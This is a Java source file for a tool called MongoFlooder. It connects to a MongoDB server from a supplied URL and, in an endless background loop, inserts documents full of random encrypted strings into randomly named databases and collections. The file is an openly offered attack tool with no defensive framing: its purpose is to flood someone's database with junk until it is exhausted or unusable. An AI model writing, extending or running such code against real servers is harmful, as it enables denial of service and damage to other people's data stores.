package gg.arcanecici.mongoflooder;

import com.mongodb.client.MongoClient;
import com.mongodb.client.MongoClients;
import com.mongodb.client.MongoDatabase;
import gg.arcanecici.mongoflooder.data.Data;
import lombok.Getter;
import org.bson.Document;

import java.io.IOException;

/**
 * @author ArcaneCiCi ~ Best CheatBreaker Developer WorldWide <3
 */

public class MongoFlooder {
    @Getter
    public static MongoFlooder instance;
    private final Data data = new Data();

    public MongoFlooder(String url) throws IOException {
        MongoClient mongo = MongoClients.create(url);
        MongoDatabase db = mongo.getDatabase(data.getEncryptedString(data.getRandomizedData()));
        new Thread(() -> {
            for (int i = 0; i < Integer.MAX_VALUE; i++) {
                try {
                    Document doc = new Document(data.getEncryptedString(data.getRandomizedData()), data.getEncryptedString(data.getRandomizedData()))
                            .append(data.getEncryptedString(data.getRandomizedData()), data.getEncryptedString(data.getRandomizedData()))
                            .append(data.getEncryptedString(data.getRandomizedData()), data.getEncryptedString(data.getRandomizedData()))
                            .append(data.getEncryptedString(data.getRandomizedData()), data.getEncryptedString(data.getRandomizedData()))
                            .append(data.getEncryptedString(data.getRandomizedData()), data.getEncryptedString(data.getRandomizedData()));

                        db.getCollection(data.getEncryptedString(data.getRandomizedData())).insertOne(doc);
                    System.out.println("[MongoFlooder] Created Document: " + doc);
                } catch (NullPointerException ex) {
                    ex.printStackTrace();
                }
            }
        }).start();
    }

}
